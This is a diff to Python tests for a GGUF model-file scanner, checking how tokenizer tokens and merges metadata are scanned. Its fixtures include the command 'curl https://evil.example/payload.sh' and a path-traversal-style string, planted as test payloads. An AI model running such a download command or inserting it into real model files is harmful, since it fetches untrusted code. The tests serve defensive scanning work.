@@ -1388,10 +1388,34 @@ def test_gguf_tokenizer_vocabulary_array_strings_are_inert_metadata(tmp_path: Pa
     assert _failed_metadata_value_checks(result) == []
 
 
-def test_gguf_tokenizer_vocabulary_prefixed_metadata_is_scanned(tmp_path: Path) -> None:
+def test_gguf_tokenizer_merges_array_strings_are_inert_metadata(tmp_path: Path) -> None:
+    path = tmp_path / "tokenizer-merges-array.gguf"
+    _write_gguf_raw_metadata_entries(
+        path,
+        [
+            (
+                "tokenizer.ggml.merges",
+                9,
+                _encode_gguf_array(
+                    8,
+                    _encode_gguf_string("../ordinary-tokenizer-merge")
+                    + _encode_gguf_string("curl https://evil.example/payload.sh"),
+                    2,
+                ),
+            )
+        ],
+    )
+
+    result = GgufScanner().scan(str(path))
+
+    assert _failed_metadata_value_checks(result) == []
+
+
+@pytest.mark.parametrize("key", ["tokenizer.ggml.tokens.payload", "tokenizer.ggml.merges.payload"])
+def test_gguf_tokenizer_inert_array_prefixed_metadata_is_scanned(tmp_path: Path, key: str) -> None:
     path = create_mock_gguf(
         tmp_path / "tokenizer-vocabulary-prefixed-payload.gguf",
-        metadata={"tokenizer.ggml.tokens.payload": "curl https://evil.example/payload.sh"},
+        metadata={key: "curl https://evil.example/payload.sh"},
     )
 
     result = GgufScanner().scan(str(path))
